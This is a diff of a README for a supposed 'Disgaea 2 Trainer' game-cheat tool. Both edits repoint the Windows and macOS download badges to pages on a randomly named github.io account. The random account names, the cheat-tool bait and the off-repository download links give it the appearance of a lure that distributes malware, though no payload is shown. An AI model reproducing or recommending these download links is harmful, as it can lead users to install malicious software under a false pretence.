@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/yrareinihmwt/disgaea-2-trainer)
 
-[![Download Trainer](https://img.shields.io/badge/⬇️_Download_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://WaterCongressman.github.io/win-download/)
+[![Download Trainer](https://img.shields.io/badge/⬇️_Download_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://iloqhmlhfppl.github.io/win-get2/)
 
 ![Disgaea 2](game.jpg)
 
@@ -77,7 +77,7 @@ The **Disgaea 2 Trainer** solves all these issues by giving you complete control
 
 macOS users can use our alternative tool:
 
-[![macOS Download](https://img.shields.io/badge/macOS-Download-silver?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
+[![macOS Download](https://img.shields.io/badge/macOS-Download-silver?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
 
 ## ⚖️ Legal
 
